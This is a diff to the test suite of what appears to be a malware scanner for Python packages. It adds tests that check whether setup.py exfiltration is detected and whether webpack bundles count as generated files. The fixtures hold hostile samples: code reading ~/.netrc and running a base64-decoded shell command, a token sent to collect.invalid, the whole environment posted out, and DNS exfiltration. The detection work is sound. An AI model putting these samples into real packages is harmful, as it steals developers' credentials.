@@ -8134,7 +8134,8 @@ class TestVendoredCodeIsSomebodyElsesReview:
         "    key = open(os.path.expanduser('~/.netrc')).read()\n"
         "    cmd = base64.b64decode(blob)\n"
         "    subprocess.run(cmd, shell=True)\n"
-        "    return key\n"
+        "    return key\n\n"
+        "run(os.environ.get('PAYLOAD', ''))\n"
     )
 
     @staticmethod
@@ -13582,3 +13583,59 @@ class TestResolvingYourOwnHostname:
         source = "import socket\nh = socket.gethostname()\nsocket.gethostbyname(h + '.collect.example.net')\n"
         found = TestMoreDecodersAndDestinations()._rules(tmp_path, source)
         assert any(r == "SUSPECT.EXFIL.DNS.001" for r, _ in found)
+
+
+class TestATokenSentToItsOwnService:
+    def _exfil(self, tmp_path, source: str) -> set[str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "setup.py").write_text(
+            source + "\nfrom setuptools import setup\nsetup(name='p')\n", encoding="utf-8"
+        )
+        return {
+            f.rule_id
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if f.rule_id in ("MALWARE.EXFIL.001", "SUSPECT.EXFIL.001")
+        }
+
+    def test_a_github_token_to_the_github_api_is_authentication(self, tmp_path) -> None:
+        source = (
+            "import os, subprocess, urllib.request\n"
+            "req = urllib.request.Request('https://api.github.com/repos/x/y/releases',\n"
+            "    headers={'Authorization': 'token ' + os.environ.get('GITHUB_API_TOKEN', '')})\n"
+            "urllib.request.urlopen(req)\nsubprocess.run(['make'])\n"
+        )
+        assert self._exfil(tmp_path, source) == set()
+
+    def test_the_same_token_sent_elsewhere_is_not(self, tmp_path) -> None:
+        source = (
+            "import os, subprocess, urllib.request\n"
+            "urllib.request.urlopen('https://collect.invalid/?t=' + os.environ.get('GITHUB_API_TOKEN', ''))\n"
+            "subprocess.run(['make'])\n"
+        )
+        assert self._exfil(tmp_path, source)
+
+    def test_the_whole_environment_is_not(self, tmp_path) -> None:
+        source = (
+            "import os, json, subprocess, urllib.request\n"
+            "urllib.request.urlopen('https://api.github.com/x', json.dumps(dict(os.environ)).encode())\n"
+            "subprocess.run(['make'])\n"
+        )
+        assert self._exfil(tmp_path, source)
+
+
+class TestContentHashedBundlesAreBuildOutput:
+    def test_a_webpack_chunk_is_generated(self) -> None:
+        from cordon_scanner.detect.secrets import is_generated_artefact
+
+        assert is_generated_artefact("jupyterlab/static/2874.ea9bd8ad31b1acb0.js")
+        assert is_generated_artefact("app/static/main-3f2a9c0d6c1b.css")
+
+    def test_a_source_file_is_not(self) -> None:
+        from cordon_scanner.detect.secrets import is_generated_artefact
+
+        assert not is_generated_artefact("src/handlers.js")
+        assert not is_generated_artefact("src/v2.handlers.js")
